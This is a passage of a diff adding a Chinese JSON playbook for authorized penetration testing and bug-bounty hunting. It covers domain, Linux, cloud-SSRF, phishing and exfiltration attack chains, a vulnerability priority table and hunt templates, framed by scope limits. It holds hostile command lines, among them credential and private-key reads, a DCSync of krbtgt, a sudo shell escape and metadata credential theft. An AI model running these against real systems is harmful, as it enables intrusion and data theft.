+     "action": "达成目标并留痕/清理",
+     "precondition": "横向成功",
+     "tools": "-",
+     "verify": "证明可达敏感数据；按授权清理"
+    }
+   ],
+   "decision_points": "1.3 无 RCE 但有 SQLi → 转数据库取凭据；有 SSRF → 转路径 4（云）；无 Web 漏洞但有弱口令 → 转 T1110.003 喷洒",
+   "failure_handling": "无 Web 漏洞入口则退回侦察补面；提权失败转凭据窃取横向",
+   "related_tactics": [
+    "TA0043",
+    "TA0001",
+    "TA0002",
+    "TA0007",
+    "TA0004",
+    "TA0006",
+    "TA0008",
+    "TA0009"
+   ],
+   "prerequisite_knowledge": "公网 URL 可达",
+   "source": "设计书附录B-四（完整步骤序列表）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "path_id": "PATH-AD-DOMAIN-02",
+   "scenario": "Windows 域攻击链（从立足点到 Domain Admin）",
+   "entry_conditions": "机器加入域，已拿到任一域普通用户凭据或交互式 Shell",
+   "step_sequence": [
+    {
+     "step": "2.1",
+     "action": "域信息枚举：域名、DC、域版本、用户、SPN",
+     "precondition": "域用户权限",
+     "tools": "BloodHound(SharpHound), PowerView, impacket-GetADUsers",
+     "verify": "拿到域 SID、DC IP、用户清单"
+    },
+    {
+     "step": "2.2",
+     "action": "（可选）LLMNR/NBT-NS 投毒 + NTLM 中继",
+     "precondition": "内网可监听流量",
+     "tools": "Responder, ntlmrelayx",
+     "verify": "捕获 Net-NTLM hash；核验：中继到目标机器拿到 shell 或解出账号"
+    },
+    {
+     "step": "2.3",
+     "action": "Kerberoasting",
+     "precondition": "任一域用户 + 目标有 SPN 账户",
+     "tools": "GetUserSPNs.py / Rubeus kerberoast",
+     "verify": "拿到 TGS hash（hashcat -m 13100）；核验：离线破解出明文密码"
+    },
+    {
+     "step": "2.4",
+     "action": "（并行）AS-REP Roasting",
+     "precondition": "目标账户禁用了预认证",
+     "tools": "GetNPUsers.py / Rubeus asreproast",
+     "verify": "拿到 AS-REP hash（hashcat -m 18200）；破解"
+    },
+    {
+     "step": "2.5",
+     "action": "Pass-the-Hash / Over-Pass-the-Hash",
+     "precondition": "拿到某用户 NTLM hash",
+     "tools": "impacket-wmiexec / psexec, mimikatz",
+     "verify": "核验：用 hash 免密登录到该用户可访问机器"
+    },
+    {
+     "step": "2.6",
+     "action": "提权至高权限后转储 LSASS/SAM",
+     "precondition": "本机 admin 或 SYSTEM",
+     "tools": "mimikatz sekurlsa::logonpasswords",
+     "verify": "核验：拿到内存中明文/hash"
+    },
+    {
+     "step": "2.7",
+     "action": "DCSync",
+     "precondition": "有 DS-Replication 权限（域管/特定 ACE）",
+     "tools": "mimikatz lsadump::dcsync /user:krbtgt",
+     "verify": "核验：拿到 krbtgt hash 与全域用户 hash"
+    },
+    {
+     "step": "2.8",
+     "action": "黄金票据（Golden Ticket）",
+     "precondition": "拿到 krbtgt hash + 域 SID",
+     "tools": "mimikatz kerberos::golden / Rubeus / ticketer.py",
+     "verify": "核验：伪造任意账户 TGT，能访问任意域资源"
+    },
+    {
+     "step": "2.9",
+     "action": "（备选）白银票据（Silver Ticket）",
+     "precondition": "拿到某服务账户 hash",
+     "tools": "同上",
+     "verify": "针对单服务伪造 TGS，更隐蔽"
+    },
+    {
+     "step": "2.10",
+     "action": "持久化与横向到目标",
+     "precondition": "域管权限",
+     "tools": "DCSync 后任意横向",
+     "verify": "核验：在 DC 或目标机落命令"
+    }
+   ],
+   "decision_points": "2.2 若 SMB 签名强制开启 → 中继失败，退回 Kerberoasting；2.3 破解不出 → 转 BloodHound 找 ACE/约束委派/AD CS 路径（Shadow Credentials、AD CS Domain Escalation、Constrained/RBCD Delegation）",
+   "failure_handling": "中继失败退回 Kerberoasting；破解不出转 ACE/委派/AD CS 提权路径",
+   "related_tactics": [
+    "TA0007",
+    "TA0006",
+    "TA0008",
+    "TA0003"
+   ],
+   "prerequisite_knowledge": "已知域控 IP / 域内普通用户凭据",
+   "source": "设计书附录B-四（完整步骤序列表）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "path_id": "PATH-LINUX-PRIVESC-03",
+   "scenario": "Linux 提权与后渗透",
+   "entry_conditions": "拿到任一非 root 用户的交互式 Shell",
+   "step_sequence": [
+    {
+     "step": "3.1",
+     "action": "基础枚举：内核版本、发行版、用户、组",
+     "precondition": "uname -a; cat /etc/*release; id; who; last",
+     "tools": "linpeas / linux-exploit-suggester",
+     "verify": "输出提权面清单"
+    },
+    {
+     "step": "3.2",
+     "action": "sudo 配置滥用",
+     "precondition": "sudo -l",
+     "tools": "对照 GTFOBins 查每个 NOPASSWD 二进制",
+     "verify": "核验：如 sudo find . -exec /bin/sh \\; 拿到 root shell"
+    },
+    {
+     "step": "3.3",
+     "action": "SUID/SGID 二进制",
+     "precondition": "find / -perm -4000 -type f 2>/dev/null",
+     "tools": "GTFOBins 逐个查",
+     "verify": "核验：如 vim/nmap/python 以 root 跑 shell"
+    },
+    {
+     "step": "3.4",
+     "action": "cron 任务滥用",
+     "precondition": "cat /etc/crontab; ls -la /etc/cron.*; ps aux | grep cron",
+     "tools": "若 root 跑的脚本/通配符/脚本可写，植入命令",
+     "verify": "核验：等待 cron 触发拿到 root"
+    },
+    {
+     "step": "3.5",
+     "action": "SSH 私钥滥用",
+     "precondition": "cat ~/.ssh/id_*; grep -r \"PRIVATE KEY\" /",
+     "tools": "用私钥登录其他主机或 root",
+     "verify": "核验：ssh -i id_rsa root@target"
+    },
+    {
+     "step": "3.6",
+     "action": "内核漏洞",
+     "precondition": "3.1 确认内核版本过旧",
+     "tools": "匹配 CVE（如 DirtyCow/CVE-2016-5195 类）",
+     "verify": "核验：跑 exp 拿到 root；警告：内核 exp 易崩系统，授权内先快照"
+    },
+    {
+     "step": "3.7",
+     "action": "服务/配置文件可写",
+     "precondition": "找可写的服务配置/数据库配置",
+     "tools": "改配置触发 root 执行",
+     "verify": "拿到 root"
+    },
+    {
+     "step": "3.8",
+     "action": "后渗透：留存、凭据收集、内网",
+     "precondition": "root 后",
+     "tools": "cat /etc/shadow, history, 找 hash",
+     "verify": "离线破解 hashcat"
+    }
+   ],
+   "decision_points": "3.2 无 sudo 可滥用 → 3.3 无 SUID → 3.4 无 cron → 3.6 内核不旧 → 转横向（本机无可提权面时，靠窃取的 SSH key/云凭据横向到其他主机）",
+   "failure_handling": "无提权面则靠窃取凭据横向；内核 exp 慎用（易崩系统，先快照）",
+   "related_tactics": [
+    "TA0007",
+    "TA0004",
+    "TA0006",
+    "TA0003"
+   ],
+   "prerequisite_knowledge": "非 root 交互式 Shell",
+   "source": "设计书附录B-四（完整步骤序列表）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "path_id": "PATH-CLOUD-SSRF-04",
+   "scenario": "云环境攻击链（SSRF → 元数据 → IAM 提权 → 横向/容器逃逸）",
+   "entry_conditions": "公网 Web 应用存在 SSRF（可让服务器发起任意请求），且运行在云主机上",
+   "step_sequence": [
+    {
+     "step": "4.1",
+     "action": "确认 SSRF",
+     "precondition": "Web 有可控 URL/参数",
+     "tools": "Burp Collaborator / interactsh",
+     "verify": "核验：服务器发起了对攻击者控制地址的请求"
+    },
+    {
+     "step": "4.2",
+     "action": "访问云元数据服务",
+     "precondition": "SSRF 可请求内网地址",
+     "tools": "http://169.254.169.254/latest/meta-data/iam/security-credentials/（AWS）；阿里云 100.100.100.200",
+     "verify": "核验：返回角色名"
+    },
+    {
+     "step": "4.3",
+     "action": "窃取临时凭据",
+     "precondition": "元数据无防护（IMDSv1）",
+     "tools": "访问上一步返回的角色路径",
+     "verify": "核验：拿到 AccessKeyId/SecretAccessKey/Token"
+    },
+    {
+     "step": "4.4",
+     "action": "用凭据枚举 IAM 权限",
+     "precondition": "拿到 AK/SK",
+     "tools": "aws sts get-caller-identity; aws iam list-*",
+     "verify": "确认该角色实际权限"
+    },
+    {
+     "step": "4.5",
+     "action": "IAM 权限提升",
+     "precondition": "角色有可滥用权限（iam:PassRole/iam:CreateAccessKey/lambda:CreateFunction）",
+     "tools": "按权限链提权（Attacking IAM 标准路径）",
+     "verify": "核验：拿到更高权限或持久化 access key"
+    },
+    {
+     "step": "4.6",
+     "action": "（并行）S3 桶权限配置错误",
+     "precondition": "枚举到桶名",
+     "tools": "aws s3 ls s3://bucket 看是否可读/可写",
+     "verify": "核验：列出/写入对象"
+    },
+    {
+     "step": "4.7",
+     "action": "容器/集群逃逸",
+     "precondition": "workload 在容器/K8s 中",
+     "tools": "检查 privileged 容器、挂载宿主目录、Docker API 暴露",
+     "verify": "核验：在宿主执行命令"
+    },
+    {
+     "step": "4.8",
+     "action": "（备选）供应链投毒",
+     "precondition": "有代码仓库/CI 写权限",
+     "tools": "typosquat / 投毒依赖",
+     "verify": "在下一次构建植入"
+    }
+   ],
+   "decision_points": "4.2 若目标已强制 IMDSv2（需 PUT token）→ SSRF 无法带 token，元数据路径失败，转找应用配置里的硬编码 AK/SK（T1552.001）；4.5 若无 IAM 提权链 → 看该角色能直接读的 S3/数据库是否即目标",
+   "failure_handling": "IMDSv2 强制转硬编码凭据；无提权链转直接可读资源",
+   "related_tactics": [
+    "TA0001",
+    "TA0006",
+    "TA0004",
+    "TA0008",
+    "TA0003"
+   ],
+   "prerequisite_knowledge": "存在 SSRF；目标运行在云主机（参考：Capital One 事件）",
+   "source": "设计书附录B-四（完整步骤序列表）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "path_id": "PATH-PHISHING-CRED-05",
+   "scenario": "办公网钓鱼与凭据收割（按授权范围考虑）",
+   "sensitivity": "sensitive",
+   "entry_conditions": "有目标员工邮箱清单（OSINT 所得），授权范围内可发钓鱼邮件",
+   "step_sequence": [
+    {
+     "step": "5.1",
+     "action": "钓鱼素材准备：仿冒页面/附件",
+     "precondition": "授权",
+     "tools": "gophish, 克隆登录页（HackTricks Phishing Methodology）",
+     "verify": "本地测试页面可收集凭据"
+    },
+    {
+     "step": "5.2",
+     "action": "鱼叉式钓鱼投递",
+     "precondition": "员工邮箱清单",
+     "tools": "按 T1566.001 附件 / .002 链接 / .003 第三方",
+     "verify": "邮件送达（不触发网关）"
+    },
+    {
+     "step": "5.3",
+     "action": "凭据收割",
+     "precondition": "用户上当输入",
+     "tools": "仿冒页/宏/恶意 LNK",
+     "verify": "核验：后台收到明文凭据或回调"
+    },
+    {
+     "step": "5.4",
+     "action": "（可选）落地执行",
+     "precondition": "用户执行附件",
+     "tools": "宏 → 反弹 shell",
+     "verify": "核验：C2 收到会话"
+    },
+    {
+     "step": "5.5",
+     "action": "凭据验证与喷洒",
+     "precondition": "拿到凭据",
+     "tools": "验证 OWA/VPN 是否可登录",
+     "verify": "核验：登录成功，转入路径 2 域攻击链"
+    }
+   ],
+   "decision_points": "5.3 无输入但有 5.4 执行 → 直接立足；若 MFA 强制 → 转 MFA 拦截/复用会话 cookie（T1550.003 / T1539）",
+   "failure_handling": "MFA 强制转会话 cookie 复用；无回调换素材重投（授权次数内）",
+   "related_tactics": [
+    "TA0042",
+    "TA0001",
+    "TA0006",
+    "TA0002"
+   ],
+   "prerequisite_knowledge": "目标员工邮箱清单；明确书面授权",
+   "source": "设计书附录B-四（完整步骤序列表）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "path_id": "PATH-DATA-EXFIL-06",
+   "scenario": "数据外泄路径（收集→汇聚→加密→外传）",
+   "sensitivity": "sensitive",
+   "entry_conditions": "已能访问敏感数据（数据库/文件共享）",
+   "step_sequence": [
+    {
+     "step": "6.1",
+     "action": "收集定位敏感数据",
+     "precondition": "已立足",
+     "tools": "find/grep、数据库导出",
+     "verify": "列出目标文件/表"
+    },
+    {
+     "step": "6.2",
+     "action": "汇聚打包",
+     "precondition": "数据分散",
+     "tools": "tar/zip/csv 导出到临时目录",
+     "verify": "生成待外传包"
+    },
+    {
+     "step": "6.3",
+     "action": "加密/混淆",
+     "precondition": "防内容检测",
+     "tools": "对称加密（T1048.001）或 Base64 编码",
+     "verify": "生成密文/编码包"
+    },
+    {
+     "step": "6.4",
+     "action": "选择外传通道（按出站策略决策）",
+     "precondition": "知道哪些端口出网",
+     "tools": "先测出网策略（curl 出 443/53/25 是否通）",
+     "verify": "确认可用通道"
+    },
+    {
+     "step": "6.5a",
+     "action": "经 C2 通道外传",
+     "precondition": "已有 C2 会话",
+     "tools": "T1041，数据塞进现有 C2 流量",
+     "verify": "核验：C2 端收到文件分片"
+    },
+    {
+     "step": "6.5b",
+     "action": "经替代协议外传",
+     "precondition": "C2 通道被限制",
+     "tools": "T1048：DNS 隧道（dnscat2）、ICMP、SMTP",
+     "verify": "核验：攻击者 DNS 服务器/邮件收到数据"
+    },
+    {
+     "step": "6.5c",
+     "action": "经合法云存储外传",
+     "precondition": "可访问外部网盘",
+     "tools": "上传到攻击者控制的桶/Git",
+     "verify": "核验：外部可见文件"
+    }
+   ],
+   "decision_points": "先测出网策略（443/53/25）→ 通则用对应通道；全堵 → 降级证明「数据已被打包待传」并记录日志证据",
+   "failure_handling": "出站全堵则降级为打包待传证明，记录日志证据（授权内不强行外发）",
+   "related_tactics": [
+    "TA0009",
+    "TA0010"
+   ],
+   "prerequisite_knowledge": "已访问敏感数据；已知出站策略",
+   "source": "设计书附录B-四（完整步骤序列表）",
+   "last_verified": "2026-10-09"
+  }
+ ],
+ "exp_vuln_priority": [
+  {
+   "vuln_type": "rce",
+   "priority": "P0",
+   "harm_keywords": [
+    "系统命令",
+    "服务器权限",
+    "组合利用链"
+   ],
+   "weight": 10,
+   "src_tendency": "极高，单价最高（超级资产严重 10 万级）",
+   "detect_points": [
+    "找反序列化入口（Redis/Log4j/Fastjson/Jackson）",
+    "模板注入点",
+    "可执行命令的功能"
+   ],
+   "reject_if": "",
+   "representative_scene": "云产品管控台 RCE、通用软件 0day、心跳类协议 RCE",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "sqli",
+   "priority": "P0",
+   "harm_keywords": [
+    "敏感数据",
+    "核心库",
+    "批量泄露"
+   ],
+   "weight": 10,
+   "src_tendency": "高（须注出≥1 条数据证明危害，严禁拖库）",
+   "detect_points": [
+    "参数/JSON/HTTP 头注入点",
+    "盲注用时间/布尔",
+    "WAF 绕过编码分块"
+   ],
+   "reject_if": "仅报错无数据回显→降 P4；严禁 information_schema 全拖库",
+   "representative_scene": "核心业务数据库 SQL 注入→获取用户手机号/身份证多元组",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "account_takeover",
+   "priority": "P0",
+   "harm_keywords": [
+    "越权操作",
+    "任意账号",
+    "主账号体系"
+   ],
+   "weight": 10,
+   "src_tendency": "高（设计缺陷类，严重/高危）",
+   "detect_points": [
+    "验证码爆破",
+    "重置 token 可预测",
+    "重置接口越权",
+    "session 不失效"
+   ],
+   "reject_if": "需高条件（如爆破 6 位码）降级",
+   "representative_scene": "主账号体系任意密码重置；6 位验证码爆破重置他人密码",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "idor",
+   "priority": "P1",
+   "harm_keywords": [
+    "越权操作",
+    "核心数据",
+    "业务影响"
+   ],
+   "weight": 7,
+   "src_tendency": "高（业务逻辑核心，不需深代码，SRC 最吃香）",
+   "detect_points": [
+    "改 user_id/order_id/手机号参数",
+    "改 Role 头/JWT",
+    "双账号对照测"
+   ],
+   "reject_if": "同一功能增删改查越权只报 1 个（避免合并降权）",
+   "representative_scene": "改 user_id=1→2 看他人信息；普通用户调管理员接口",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "payment_logic",
+   "priority": "P1",
+   "harm_keywords": [
+    "业务资损",
+    "0 元购",
+    "并发竞态"
+   ],
+   "weight": 7,
+   "src_tendency": "高（ASRC 严重：实际海量资损/直接刷钱）",
+   "detect_points": [
+    "抓包改金额/数量为负/小数",
+    "优惠券叠加/重复用",
+    "并发重放签到/领奖"
+   ],
+   "reject_if": "禁真实支付，仅抓包观测；证明资损即停",
+   "representative_scene": "支付金额改 0.01；优惠券叠加到 0 元；并发刷签到积分",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "ssrf",
+   "priority": "P1",
+   "harm_keywords": [
+    "内网穿透",
+    "云元数据",
+    "敏感数据"
+   ],
+   "weight": 7,
+   "src_tendency": "高（ASRC 高危：HTTP/Socks 代理进核心网或回显 SSRF）",
+   "detect_points": [
+    "找 URL 抓取/图片代理/webhook 功能",
+    "打 169.254.169.254 云元数据",
+    "gopher 打 Redis"
+   ],
+   "reject_if": "仅能读自身无进一步利用＝降级",
+   "representative_scene": "图片转存 SSRF→读阿里云/AWS 元数据→取 AK/SK",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "file_upload",
+   "priority": "P1",
+   "harm_keywords": [
+    "webshell",
+    "服务器权限"
+   ],
+   "weight": 7,
+   "src_tendency": "高（未授权可组合达 RCE 即收）",
+   "detect_points": [
+    "扩展名/Content-Type/图片马/.htaccess 绕过",
+    "二次渲染绕过"
+   ],
+   "reject_if": "字节等平台须提前报备；拿 webshell 后漏洞盒子禁下载源码审计",
+   "representative_scene": "头像上传绕过→传 WebShell",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "weak_password",
+   "priority": "P1",
+   "harm_keywords": [
+    "弱口令",
+    "管理员",
+    "系统重要度"
+   ],
+   "weight": 7,
+   "src_tendency": "漏洞盒子/补天明确收录（重要系统管理员弱口令=高危）",
+   "detect_points": [
+    "默认口令/常见弱口令",
+    "按系统重要度定级"
+   ],
+   "reject_if": "同系统多用户弱口令只确认第 1 个；后台爆破仅收成功登录案例",
+   "representative_scene": "重要系统管理员弱口令直接登录后台",
+   "source": "设计书附录C-六差异对照（漏洞盒子 faq?id=79 / 补天收录规范）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "unauthorized_access",
+   "priority": "P2",
+   "harm_keywords": [
+    "未授权",
+    "后台接管",
+    "少量敏感信息"
+   ],
+   "weight": 4,
+   "src_tendency": "中（含敏感信息=中危；海量服务器权限=严重/高危）",
+   "detect_points": [
+    "路径爆破找 /admin /api",
+    "swagger 未授权",
+    "springboot actuator"
+   ],
+   "reject_if": "",
+   "representative_scene": "/actuator/env 未授权泄露配置；后台未授权",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "stored_xss",
+   "priority": "P2",
+   "harm_keywords": [
+    "Cookie 窃取",
+    "打管理员",
+    "核心功能"
+   ],
+   "weight": 4,
+   "src_tendency": "中~高（打管理员获取敏感数据=高危；普通页面存储 XSS=中危）",
+   "detect_points": [
+    "找富文本/评论/签名",
+    "打后台审核员/客服"
+   ],
+   "reject_if": "",
+   "representative_scene": "客服后台存储 XSS→盗取客服 session 进管理平台",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "info_disclosure",
+   "priority": "P2",
+   "harm_keywords": [
+    "敏感数据",
+    "配置",
+    "备份文件"
+   ],
+   "weight": 4,
+   "src_tendency": "中~低（视字段数；≥3 敏感字段才够严重信息定义）",
+   "detect_points": [
+    "/backup /config.php /db.sql",
+    ".git 泄露",
+    "swagger 文档泄露"
+   ],
+   "reject_if": "不足 3 个敏感字段降级；纯 phpinfo/目录遍历＝P4 拒收",
+   "representative_scene": "/db_backup.sql 拿到用户明文密码",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "minor_idor",
+   "priority": "P2",
+   "harm_keywords": [
+    "少量越权",
+    "策略绕过"
+   ],
+   "weight": 4,
+   "src_tendency": "中（少量核心资产修改=中危）",
+   "detect_points": [
+    "短信验证码复用/缺失",
+    "加密算法破解",
+    "安全锁绕过"
+   ],
+   "reject_if": "",
+   "representative_scene": "修改密码后端不校验验证码→任意重置",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "xss",
+   "priority": "P3",
+   "harm_keywords": [
+    "需交互",
+    "影响有限"
+   ],
+   "weight": 1,
+   "src_tendency": "低（ASRC 列中危/低危；漏洞盒子低危 ¥50~200）",
+   "detect_points": [
+    "callback=jsonp 读敏感接口",
+    "Origin 反射+凭据"
+   ],
+   "reject_if": "仅非 Chrome 触发＝低危/拒收",
+   "representative_scene": "反射 XSS 打 Cookie；CORS ACAO:*+凭据",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "url_redirect",
+   "priority": "P3",
+   "harm_keywords": [
+    "钓鱼辅助",
+    "骚扰"
+   ],
+   "weight": 1,
+   "src_tendency": "低~不收（ASRC 低危；需登录/固定域名跳转降级）",
+   "detect_points": [
+    "target/url/link/redirect 参数"
+   ],
+   "reject_if": "",
+   "representative_scene": "登录后跳转钓鱼站",
+   "source": "设计书附录C-2.1（综合 ASRC 五级/TSRC 技术+业务维度/漏洞盒子评定原则）",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "pure_info_disclosure",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "phpinfo/目录遍历/异常报错/SVN/内网 IP 域名泄露/无敏感信息 demo",
+   "representative_scene": "纯信息泄露，无敏感数据无法进一步利用",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "config_advice",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "缺安全头/弱 TLS 套件/无 CSP 等配置建议",
+   "representative_scene": "属配置非漏洞，无利用链",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "self_xss",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "仅自己输入自己看到的 XSS",
+   "representative_scene": "无受害者、无法触发他人",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "harmless_csrf",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "改头像/退出登录等无敏感操作 CSRF",
+   "representative_scene": "无实际危害",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "error_no_proof",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "SQL 报错但无危害证明（不出数据）",
+   "representative_scene": "未证明危害",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "business_logic",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "业务正常逻辑/预期行为",
+   "representative_scene": "非缺陷",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "unreproducible",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "无法复现/仅理论可行无成功案例/仅给结果无 PoC",
+   "representative_scene": "审核员复现不出",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "duplicate",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "与已有/已公开漏洞重复",
+   "representative_scene": "已被收录",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "test_env",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "测试环境/测试数据漏洞（未运行实际业务的机器）",
+   "representative_scene": "无生产危害",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "vendor_eol",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "厂商已停止维护/权重过低小站",
+   "representative_scene": "无处置价值",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "non_chrome_xss",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "仅非 Chrome 触发的 XSS/JSONP",
+   "representative_scene": "利用面极窄",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "vuln_type": "mail_bombing",
+   "priority": "P4",
+   "harm_keywords": [],
+   "weight": 0,
+   "src_tendency": "一律不提交",
+   "detect_points": [],
+   "reject_if": "邮件轰炸/轮询多手机短信轰炸",
+   "representative_scene": "骚扰类、非安全漏洞",
+   "source": "设计书附录C-2.2 拒收清单",
+   "last_verified": "2026-10-09"
+  }
+ ],
+ "exp_hunt_templates": [
+  {
+   "template_id": "HUNT-01",
+   "scene": "目标资产收集与攻击面梳理",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "读 SRC 公告拿授权根域名/资产清单（含子域、APP、小程序、云资产）",
+    "子域名枚举：OneForAll/Subfinder/Assetfinder + site:target.com -www，配合 DNS 历史记录（viewdns）找未上 CDN 的真实 IP",
+    "IP/端口/指纹：微步/Shodan/Zoomeye 查归属，Nmap 扫端口，Wappalyzer/WhatWeb 识别技术栈",
+    "API 与文档：Dirsearch/Gobuster 扫 /api/ /v1/ /swagger-ui.html /v2/api-docs /actuator",
+    "敏感文件：/robots.txt /backup/ /config.php /.git/ /db_backup.sql /README.md",
+    "移动端/小程序/供应链：反编译 APP 找硬编码 AK/SK/内部接口；抓小程序包找后端 API",
+    "产出攻击面清单（域名→服务→技术栈→可疑入口），按 P0~P4 排优先级"
+   ],
+   "tools": [
+    "OneForAll",
+    "Subfinder",
+    "Nmap",
+    "Wappalyzer",
+    "Dirsearch",
+    "Shodan"
+   ],
+   "common_pitfall": "勿超授权范围扫描；测试/预发子域常缺 WAF 但也可能是无效测试环境",
+   "related_vuln_type": "unauthorized_access,info_disclosure",
+   "compliance_redline": "严格在 SRC 公告资产内测",
+   "expected_priority": "P2",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "HUNT-02",
+   "scene": "登录与认证绕过 / 任意密码重置",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "走完整注册→登录→改密→找回密流程，抓全部接口",
+    "测验证码：可复用/后端不校验（空值/固定值）/爆破（6 位无次数限制）/返回包泄露",
+    "测重置 token：可预测/与用户无关、改 user=victim 参数、重置链接不绑定会话",
+    "测 session：登录前后是否刷新（会话固定）、退出后 Cookie 是否失效",
+    "测 JWT：弱密钥爆破、alg:none、篡改 role",
+    "判定：能接管任意主账号＝P0；需高条件（爆破 6 位码）降级"
+   ],
+   "tools": [
+    "Burp",
+    "jwt_tool",
+    "hashcat"
+   ],
+   "common_pitfall": "验证码复用误判（前端校验假象）",
+   "related_vuln_type": "account_takeover",
+   "compliance_redline": "爆破注意频率，禁造成验证码服务不可用",
+   "expected_priority": "P0",
+   "source": "设计书附录C-三",
+   "last_verified": "2026-10-09"
+  },
+  {
+   "template_id": "HUNT-03",
+   "scene": "支付/优惠券/订单业务逻辑",
+   "precondition": "已读目标 SRC 规则页确认授权范围与红线；全程双账号/抓包，操作留痕截图带时间戳；不拖库、不下源码、不发起真实支付",
+   "step_sequence": [
+    "定位商品下单→结算→支付→退款全链路接口，全部抓包",
+    "金额篡改：改 price/amount 为 0.01、负数、极小小数；改数量为负",
+    "优惠券：叠加互斥券、一次性券重复用、改券面额/适用范围",
+    "并发竞态：Burp Intruder 并发重放签到/领奖/提现接口，看是否重复到账",
+    "退款/积分：退款后货物未回收、积分重复计算、负数金额溢出"
+   ],
+   "tools": [
+    "Burp Intruder",
+    "抓包代理"
+   ],
+   "common_pitfall": "前端改价后端重算则无效",
+   "related_vuln_type": "payment_logic",
+   "compliance_redline": "禁止真实下单/真实支付，仅抓包观测请求与响应；证明资损即可停",
